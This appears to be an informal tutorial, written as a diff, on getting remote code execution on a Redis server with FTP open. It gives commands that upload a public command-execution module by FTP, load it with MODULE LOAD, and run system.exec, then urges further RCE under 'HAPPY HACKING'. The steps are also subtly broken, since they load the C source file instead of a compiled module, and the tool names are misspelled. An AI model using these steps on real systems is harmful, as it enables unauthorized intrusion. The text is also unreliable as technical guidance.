@@ -1,0 +1,31 @@
+Redis Cli Penetration testing 
+If you facing the machine which port open FTP AND REDIS THAN YOU TRY THIS STEPS LETS SEE WHAT HAPPNED....
+
+Redis cli is a nosql server this server is connected to shell
+So if you want to able redit cli command than you try one think ...
+
+redis-cli -h <target-Ip>
+
+Now you open a new terminal 
+You save the you kali terminal this file
+
+https://github.com/n0b0dyCN/RedisModules-ExecuteCommand/blob/master/src/module.c
+
+Now you open ftp server
+
+ftp <target-ip>
+
+ftp > put module.c
+ftp > exit
+
+Now you return redic-cli and run
+
+redis-cli > MODULE LOAD /var/ftp/pub/module.c
+radis-cli > system.exec "id"
+
+Boom system id show now you able to access the system
+So now you try RCE ( remote code execution ) or other techniques to access system .
+
+---------------------------
+HAPPY HACKING
+----------------------------
